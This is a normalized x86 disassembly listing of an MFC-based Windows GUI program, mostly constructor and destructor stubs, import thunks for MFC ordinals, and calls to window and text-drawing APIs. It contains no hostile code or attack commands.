jmp sub_402ff9
sub_402fdd
push esi
mov esi ecx
call sub_402ff9
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403073
mov eax rw-data
retn
sub_4030a5
add ecx 0x14
call sub_4037b6
retn 0x4
j_sub_4033b5
jmp sub_4033b5
sub_403475
mov eax rwxdata
retn
sub_40347b
push esi
mov esi ecx
call sub_403497
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_4034ee
push esi
mov esi ecx
call sub_40101c
mov [ esi ] r--data
mov [ esi + 0x20 ] 0xffffff
mov eax esi
pop esi
retn
sub_403507
push esi
mov esi ecx
call sub_403523
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403523
mov [ ecx ] r--data
jmp sub_401025
sub_40352e
mov eax [ ecx + 0x20 ]
retn
sub_40355e
push esi
mov esi ecx
call sub_40357a
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_40371e
lea eax [ ecx + 0x8 ]
retn
sub_403826
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_40382c
mov eax r--data
retn
sub_403832
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_403846
push esi
mov esi ecx
call sub_403862
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403862
jmp Ordinal_MFC42_815
sub_403867
call sub_403871
jmp sub_40387b
sub_403871
mov ecx rw-data
jmp sub_403832
sub_40387b
push sub_403887
call sub_4045db
pop ecx
retn
sub_403887
mov ecx rw-data
jmp sub_403862
sub_403962
push esi
push 0x0
mov esi ecx
push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_403978
push esi
mov esi ecx
call sub_403994
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403994
jmp Ordinal_MFC42_641
sub_403999
retn 0x4
sub_40399c
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_4039a2
mov eax r--data
retn
sub_403a4c
push 0x0
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_403a58
push 0x1
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_403a96
mov eax [ Ordinal_MFC42_1825@IAT ]
retn
sub_403a9c
mov eax r--data
retn
sub_403aa2
mov eax [ Ordinal_MFC42_4238@IAT ]
retn
sub_403aa8
mov eax r--data
retn
sub_403aae
push esi
mov esi ecx
call Ordinal_MFC42_338
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_403ac0
push esi
mov esi ecx
call sub_403adc
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403adc
mov [ ecx ] r--data
jmp Ordinal_MFC42_652
sub_403ae7
call Ordinal_MFC42_4823
neg eax
sbb eax eax
neg eax
retn
sub_403af3
mov eax [ ecx + 0x48 ]
retn
sub_403af7
mov eax [ esp + 0x4 ]
mov [ ecx + 0x48 ] eax
retn 0x4
sub_403b33
mov eax [ Ordinal_MFC42_1945@IAT ]
retn
sub_403b39
mov eax r--data
retn
sub_403b3f
mov eax [ Ordinal_MFC42_4273@IAT ]
retn
sub_403b45
mov eax r--data
retn
sub_403b92
push esi
mov esi ecx
call sub_403bae
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403be9
push [ esp + 0x4 ]
call Ordinal_MFC42_5260
retn 0x4
sub_403bf5
push [ esp + 0x4 ]
call Ordinal_MFC42_2535
retn 0x4
sub_403c01
retn 0x8
sub_403e9d
push esi
mov esi ecx
call sub_403e09
test [ esp + 0x8 ] 0x1
je rwxdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
sub_403eec
xor eax eax
retn 0x4
sub_403f2e
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_403f42
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_403f52
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_403fcb
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_404017
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_3619
jmp [ Ordinal_MFC42_3619@IAT ]
Ordinal_MFC42_3663
jmp [ Ordinal_MFC42_3663@IAT ]
Ordinal_MFC42_3626
jmp [ Ordinal_MFC42_3626@IAT ]
Ordinal_MFC42_2414
jmp [ Ordinal_MFC42_2414@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_537
jmp [ Ordinal_MFC42_537@IAT ]
Ordinal_MFC42_5875
jmp [ Ordinal_MFC42_5875@IAT ]
Ordinal_MFC42_2754
jmp [ Ordinal_MFC42_2754@IAT ]
Ordinal_MFC42_2243
jmp [ Ordinal_MFC42_2243@IAT ]
Ordinal_MFC42_2723
jmp [ Ordinal_MFC42_2723@IAT ]
Ordinal_MFC42_2390
jmp [ Ordinal_MFC42_2390@IAT ]
Ordinal_MFC42_3059
jmp [ Ordinal_MFC42_3059@IAT ]
Ordinal_MFC42_5100
jmp [ Ordinal_MFC42_5100@IAT ]
Ordinal_MFC42_5103
jmp [ Ordinal_MFC42_5103@IAT ]
Ordinal_MFC42_4467
jmp [ Ordinal_MFC42_4467@IAT ]
Ordinal_MFC42_4303
jmp [ Ordinal_MFC42_4303@IAT ]
Ordinal_MFC42_3350
jmp [ Ordinal_MFC42_3350@IAT ]
Ordinal_MFC42_5012
jmp [ Ordinal_MFC42_5012@IAT ]
Ordinal_MFC42_975
jmp [ Ordinal_MFC42_975@IAT ]
Ordinal_MFC42_5472
jmp [ Ordinal_MFC42_5472@IAT ]
Ordinal_MFC42_3403
jmp [ Ordinal_MFC42_3403@IAT ]
Ordinal_MFC42_2879
jmp [ Ordinal_MFC42_2879@IAT ]
Ordinal_MFC42_2878
jmp [ Ordinal_MFC42_2878@IAT ]
Ordinal_MFC42_4151
jmp [ Ordinal_MFC42_4151@IAT ]
Ordinal_MFC42_6055
jmp [ Ordinal_MFC42_6055@IAT ]
Ordinal_MFC42_4077
jmp [ Ordinal_MFC42_4077@IAT ]
Ordinal_MFC42_1776
jmp [ Ordinal_MFC42_1776@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5237
jmp [ Ordinal_MFC42_5237@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5282
jmp [ Ordinal_MFC42_5282@IAT ]
Ordinal_MFC42_2649
jmp [ Ordinal_MFC42_2649@IAT ]
Ordinal_MFC42_1665
jmp [ Ordinal_MFC42_1665@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4436
jmp [ Ordinal_MFC42_4436@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4427
jmp [ Ordinal_MFC42_4427@IAT ]
Ordinal_MFC42_796
jmp [ Ordinal_MFC42_796@IAT ]
Ordinal_MFC42_674
jmp [ Ordinal_MFC42_674@IAT ]
Ordinal_MFC42_554
jmp [ Ordinal_MFC42_554@IAT ]
Ordinal_MFC42_529
jmp [ Ordinal_MFC42_529@IAT ]
Ordinal_MFC42_366
jmp [ Ordinal_MFC42_366@IAT ]
Ordinal_MFC42_807
jmp [ Ordinal_MFC42_807@IAT ]
Ordinal_MFC42_6000
jmp [ Ordinal_MFC42_6000@IAT ]
Ordinal_MFC42_2117
jmp [ Ordinal_MFC42_2117@IAT ]
Ordinal_MFC42_4457
jmp [ Ordinal_MFC42_4457@IAT ]
Ordinal_MFC42_5252
jmp [ Ordinal_MFC42_5252@IAT ]
Ordinal_MFC42_2884
jmp [ Ordinal_MFC42_2884@IAT ]
Ordinal_MFC42_1175
jmp [ Ordinal_MFC42_1175@IAT ]
Ordinal_MFC42_3571
jmp [ Ordinal_MFC42_3571@IAT ]
Ordinal_MFC42_640
jmp [ Ordinal_MFC42_640@IAT ]
Ordinal_MFC42_5785
jmp [ Ordinal_MFC42_5785@IAT ]
Ordinal_MFC42_1640
jmp [ Ordinal_MFC42_1640@IAT ]
Ordinal_MFC42_323
jmp [ Ordinal_MFC42_323@IAT ]
Ordinal_MFC42_1641
jmp [ Ordinal_MFC42_1641@IAT ]
Ordinal_MFC42_1146
jmp [ Ordinal_MFC42_1146@IAT ]
Ordinal_MFC42_500
jmp [ Ordinal_MFC42_500@IAT ]
Ordinal_MFC42_772
jmp [ Ordinal_MFC42_772@IAT ]
Ordinal_MFC42_5860
jmp [ Ordinal_MFC42_5860@IAT ]
Ordinal_MFC42_6142
jmp [ Ordinal_MFC42_6142@IAT ]
Ordinal_MFC42_4615
jmp [ Ordinal_MFC42_4615@IAT ]
Ordinal_MFC42_4612
jmp [ Ordinal_MFC42_4612@IAT ]
Ordinal_MFC42_4610
jmp [ Ordinal_MFC42_4610@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_617
jmp [ Ordinal_MFC42_617@IAT ]
Ordinal_MFC42_6215
jmp [ Ordinal_MFC42_6215@IAT ]
Ordinal_MFC42_5301
jmp [ Ordinal_MFC42_5301@IAT ]
Ordinal_MFC42_5214
jmp [ Ordinal_MFC42_5214@IAT ]
Ordinal_MFC42_296
jmp [ Ordinal_MFC42_296@IAT ]
Ordinal_MFC42_986
jmp [ Ordinal_MFC42_986@IAT ]
Ordinal_MFC42_520
jmp [ Ordinal_MFC42_520@IAT ]
Ordinal_MFC42_4159
jmp [ Ordinal_MFC42_4159@IAT ]
Ordinal_MFC42_6117
jmp [ Ordinal_MFC42_6117@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_4696
jmp [ Ordinal_MFC42_4696@IAT ]
Ordinal_MFC42_3058
jmp [ Ordinal_MFC42_3058@IAT ]
Ordinal_MFC42_3065
jmp [ Ordinal_MFC42_3065@IAT ]
Ordinal_MFC42_6336
jmp [ Ordinal_MFC42_6336@IAT ]
Ordinal_MFC42_2510
jmp [ Ordinal_MFC42_2510@IAT ]
Ordinal_MFC42_2542
jmp [ Ordinal_MFC42_2542@IAT ]
Ordinal_MFC42_5243
jmp [ Ordinal_MFC42_5243@IAT ]
Ordinal_MFC42_5740
jmp [ Ordinal_MFC42_5740@IAT ]
Ordinal_MFC42_1746
jmp [ Ordinal_MFC42_1746@IAT ]
Ordinal_MFC42_5577
jmp [ Ordinal_MFC42_5577@IAT ]
Ordinal_MFC42_3172
jmp [ Ordinal_MFC42_3172@IAT ]
Ordinal_MFC42_5653
jmp [ Ordinal_MFC42_5653@IAT ]
Ordinal_MFC42_4420
jmp [ Ordinal_MFC42_4420@IAT ]
Ordinal_MFC42_4953
jmp [ Ordinal_MFC42_4953@IAT ]
Ordinal_MFC42_4858
jmp [ Ordinal_MFC42_4858@IAT ]
Ordinal_MFC42_2399
jmp [ Ordinal_MFC42_2399@IAT ]
Ordinal_MFC42_4387
jmp [ Ordinal_MFC42_4387@IAT ]
Ordinal_MFC42_3454
jmp [ Ordinal_MFC42_3454@IAT ]
Ordinal_MFC42_3198
jmp [ Ordinal_MFC42_3198@IAT ]
Ordinal_MFC42_6080
jmp [ Ordinal_MFC42_6080@IAT ]
Ordinal_MFC42_6175
jmp [ Ordinal_MFC42_6175@IAT ]
Ordinal_MFC42_4623
jmp [ Ordinal_MFC42_4623@IAT ]
Ordinal_MFC42_4426
jmp [ Ordinal_MFC42_4426@IAT ]
Ordinal_MFC42_338
jmp [ Ordinal_MFC42_338@IAT ]
Ordinal_MFC42_652
jmp [ Ordinal_MFC42_652@IAT ]
Ordinal_MFC42_4823
jmp [ Ordinal_MFC42_4823@IAT ]
Ordinal_MFC42_4614
jmp [ Ordinal_MFC42_4614@IAT ]
Ordinal_MFC42_4613
jmp [ Ordinal_MFC42_4613@IAT ]
Ordinal_MFC42_4589
jmp [ Ordinal_MFC42_4589@IAT ]
Ordinal_MFC42_4899
jmp [ Ordinal_MFC42_4899@IAT ]
Ordinal_MFC42_5076
jmp [ Ordinal_MFC42_5076@IAT ]
Ordinal_MFC42_4341
jmp [ Ordinal_MFC42_4341@IAT ]
Ordinal_MFC42_4349
jmp [ Ordinal_MFC42_4349@IAT ]
Ordinal_MFC42_4723
jmp [ Ordinal_MFC42_4723@IAT ]
Ordinal_MFC42_4890
jmp [ Ordinal_MFC42_4890@IAT ]
Ordinal_MFC42_4531
jmp [ Ordinal_MFC42_4531@IAT ]
Ordinal_MFC42_4545
jmp [ Ordinal_MFC42_4545@IAT ]
Ordinal_MFC42_4543
jmp [ Ordinal_MFC42_4543@IAT ]
Ordinal_MFC42_4526
jmp [ Ordinal_MFC42_4526@IAT ]
Ordinal_MFC42_4529
jmp [ Ordinal_MFC42_4529@IAT ]
Ordinal_MFC42_4524
jmp [ Ordinal_MFC42_4524@IAT ]
Ordinal_MFC42_4964
jmp [ Ordinal_MFC42_4964@IAT ]
Ordinal_MFC42_4961
jmp [ Ordinal_MFC42_4961@IAT ]
Ordinal_MFC42_4108
jmp [ Ordinal_MFC42_4108@IAT ]
Ordinal_MFC42_5240
jmp [ Ordinal_MFC42_5240@IAT ]
Ordinal_MFC42_5290
jmp [ Ordinal_MFC42_5290@IAT ]
Ordinal_MFC42_3748
jmp [ Ordinal_MFC42_3748@IAT ]
Ordinal_MFC42_1726
jmp [ Ordinal_MFC42_1726@IAT ]
Ordinal_MFC42_4432
jmp [ Ordinal_MFC42_4432@IAT ]
Ordinal_MFC42_813
jmp [ Ordinal_MFC42_813@IAT ]
Ordinal_MFC42_560
jmp [ Ordinal_MFC42_560@IAT ]
Ordinal_MFC42_5260
jmp [ Ordinal_MFC42_5260@IAT ]
Ordinal_MFC42_2535
jmp [ Ordinal_MFC42_2535@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_613
jmp [ Ordinal_MFC42_613@IAT ]
Ordinal_MFC42_289
jmp [ Ordinal_MFC42_289@IAT ]
Ordinal_MFC42_2971
jmp [ Ordinal_MFC42_2971@IAT ]
Ordinal_MFC42_5759
jmp [ Ordinal_MFC42_5759@IAT ]
Ordinal_MFC42_6192
jmp [ Ordinal_MFC42_6192@IAT ]
Ordinal_MFC42_5756
jmp [ Ordinal_MFC42_5756@IAT ]
Ordinal_MFC42_6186
jmp [ Ordinal_MFC42_6186@IAT ]
Ordinal_MFC42_4330
jmp [ Ordinal_MFC42_4330@IAT ]
Ordinal_MFC42_6189
jmp [ Ordinal_MFC42_6189@IAT ]
Ordinal_MFC42_6021
jmp [ Ordinal_MFC42_6021@IAT ]
Ordinal_MFC42_6172
jmp [ Ordinal_MFC42_6172@IAT ]
Ordinal_MFC42_5873
jmp [ Ordinal_MFC42_5873@IAT ]
Ordinal_MFC42_5789
jmp [ Ordinal_MFC42_5789@IAT ]
Ordinal_MFC42_5794
jmp [ Ordinal_MFC42_5794@IAT ]
Ordinal_MFC42_5678
jmp [ Ordinal_MFC42_5678@IAT ]
Ordinal_MFC42_5736
jmp [ Ordinal_MFC42_5736@IAT ]
Ordinal_MFC42_5579
jmp [ Ordinal_MFC42_5579@IAT ]
Ordinal_MFC42_5571
jmp [ Ordinal_MFC42_5571@IAT ]
Ordinal_MFC42_6061
jmp [ Ordinal_MFC42_6061@IAT ]
Ordinal_MFC42_5864
jmp [ Ordinal_MFC42_5864@IAT ]
Ordinal_MFC42_3596
jmp [ Ordinal_MFC42_3596@IAT ]
Ordinal_MFC42_283
jmp [ Ordinal_MFC42_283@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
_ftol
jmp [ _ftol@IAT ]
sin
jmp [ sin@IAT ]
cos
jmp [ cos@IAT ]
memcpy
jmp [ memcpy@IAT ]
sub_4045af
cmp [ rw-data ] 0xffffffff
jne rwxdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_4045db
push [ esp + 0x4 ]
call sub_4045af
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_4045f4
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
_purecall
jmp [ _purecall@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40478a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40479c
xor eax eax
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_4047ac
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_4047f2
jmp sub_4047f2
sub_4047f2
push 0x600
push 0x0
call sub_4047c4
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
sub_404810
mov ecx [ ebp - 0x10 ]
jmp sub_4029a7
sub_404818
mov ecx [ ebp - 0x14 ]
jmp sub_4028d3
sub_404820
mov eax r--data
jmp __CxxFrameHandler
sub_40482c
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_404834
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_40483c
mov eax r--data
jmp __CxxFrameHandler
sub_404848
mov ecx [ ebp - 0x10 ]
jmp sub_4028d3
sub_404850
mov eax r--data
jmp __CxxFrameHandler
sub_40485c
mov ecx [ ebp - 0x10 ]
jmp sub_4028d3
sub_404864
mov eax r--data
jmp __CxxFrameHandler
sub_404870
mov ecx [ ebp - 0x10 ]
jmp sub_4029a7
sub_404878
mov ecx [ ebp - 0x14 ]
jmp sub_4028d3
sub_404880
mov eax r--data
jmp __CxxFrameHandler
sub_40488c
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_404894
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_40489c
mov eax r--data
jmp __CxxFrameHandler
sub_4048a8
mov ecx [ ebp - 0x10 ]
jmp sub_4029a7
sub_4048b0
mov ecx [ ebp - 0x14 ]
jmp sub_4028d3
sub_4048b8
mov eax r--data
jmp __CxxFrameHandler
sub_4048c4
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_4048cc
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_4048d4
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_4048dc
mov eax r--data
jmp __CxxFrameHandler
sub_4048e8
push [ ebp - 0x10 ]
call sub_402f31
retn
sub_4048f1
mov eax r--data
jmp __CxxFrameHandler
sub_4048fc
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_404904
mov ecx [ ebp - 0x10 ]
add ecx 0xc4
jmp Ordinal_MFC42_796
sub_404912
mov eax r--data
jmp __CxxFrameHandler
sub_40491c
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_674
sub_404924
mov ecx [ ebp - 0x10 ]
add ecx 0xc4
jmp Ordinal_MFC42_796
sub_404932
mov eax r--data
jmp __CxxFrameHandler
sub_40493c
mov ecx [ ebp - 0x10 ]
jmp sub_4029a7
sub_404944
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402949
sub_40494f
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_403497
sub_40495a
mov eax r--data
jmp __CxxFrameHandler
sub_404964
mov ecx [ ebp - 0x10 ]
jmp sub_4029a7
sub_40496c
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402949
sub_404977
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_403497
sub_404982
mov ecx [ ebp - 0x14 ]
jmp sub_4028d3
sub_40498a
mov ecx [ ebp - 0x14 ]
jmp sub_4028d3
sub_404992
mov eax r--data
jmp __CxxFrameHandler
sub_40499c
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_640
sub_4049a4
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_4049ac
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_4049b4
lea ecx [ ebp + 0xc ]
jmp Ordinal_MFC42_800
sub_4049bc
mov eax r--data
jmp __CxxFrameHandler
sub_4049c8
push [ ebp - 0x14 ]
call Ordinal_MFC42_825
pop ecx
retn
sub_4049d2
mov eax r--data
jmp __CxxFrameHandler
sub_4049dc
mov ecx [ ebp - 0x10 ]
jmp sub_4028d3
sub_4049e4
mov eax r--data
jmp __CxxFrameHandler
sub_4049f0
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp Ordinal_MFC42_772
sub_4049fb
mov eax r--data
jmp __CxxFrameHandler
sub_404a08
push [ ebp - 0x14 ]
call Ordinal_MFC42_825
pop ecx
retn
sub_404a12
mov eax r--data
jmp __CxxFrameHandler
sub_404a1c
push [ ebp - 0x10 ]
call sub_402f31
retn
sub_404a25
lea ecx [ ebp - 0x34 ]
jmp Ordinal_MFC42_617
sub_404a2d
mov eax r--data
jmp __CxxFrameHandler
sub_404a38
lea ecx [ ebp - 0x6c ]
jmp sub_403994
sub_404a40
mov eax r--data
jmp __CxxFrameHandler
sub_404a4c
push [ ebp - 0x10 ]
call sub_402f31
retn
sub_404a55
mov eax r--data
jmp __CxxFrameHandler
sub_404a60
push [ ebp - 0x10 ]
call sub_402f31
retn
sub_404a69
mov eax r--data
jmp __CxxFrameHandler
sub_404a74
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_813
sub_404a7c
mov eax r--data
jmp __CxxFrameHandler
sub_404a88
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_813
sub_404a90
mov eax r--data
jmp __CxxFrameHandler
sub_404a9c
lea ecx [ ebp - 0x30 ]
jmp Ordinal_MFC42_613
sub_404aa4
lea ecx [ ebp - 0x5c ]
jmp sub_403e09
sub_404aac
mov eax r--data
jmp __CxxFrameHandler
sub_404ab8
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_640
sub_404ac0
push [ ebp + 0xc ]
call sub_402f31
retn
sub_404ac9
mov eax r--data
jmp __CxxFrameHandler
sub_404ad4
mov ecx [ ebp - 0x14 ]
jmp Ordinal_MFC42_640
sub_404adc
mov eax r--data
jmp __CxxFrameHandler
sub_404ae8
lea ecx [ ebp - 0x60 ]
jmp Ordinal_MFC42_755
sub_404af0
mov eax r--data
jmp __CxxFrameHandler
